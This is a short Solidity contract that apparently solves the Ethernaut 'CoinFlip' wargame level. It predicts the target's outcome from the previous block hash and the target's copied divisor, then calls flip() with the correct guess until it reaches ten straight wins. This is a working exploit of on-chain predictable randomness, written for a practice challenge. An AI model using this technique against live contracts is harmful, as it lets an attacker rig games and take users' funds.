//SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface ICoinFlip {
    function consecutiveWins() external view returns (uint256);

    function flip(bool _guess) external returns (bool);
}

contract CoinFlipExploit {
    ICoinFlip public implementation;
    uint256 COPIED_FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    /// @notice Constructor called at deployment of contract
    /// @param _implementation contract address of ethernaut `CoinFlip` challenge
    /// Note: https://ethernaut.openzeppelin.com/level/0x9240670dbd6476e6a32055E52A0b0756abd26fd2
    constructor(ICoinFlip _implementation) {
        implementation = _implementation;
    }

    /// @notice Uses the "random" logic to derive the correct guess.
    /// @dev Should be called in different blocks
    function exploit() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        bool derivedGuess = blockValue / COPIED_FACTOR == 1 ? true : false;

        implementation.flip(derivedGuess);
    }

    /// @notice Returns a boolean wheter the `implementation` contract challenge has been solved
    /// @return _isExploitComplete Boolean showing the state of `implementation` exploit
    function exploited() external view returns (bool _isExploitComplete) {
        _isExploitComplete = implementation.consecutiveWins() >= 10;
    }
}
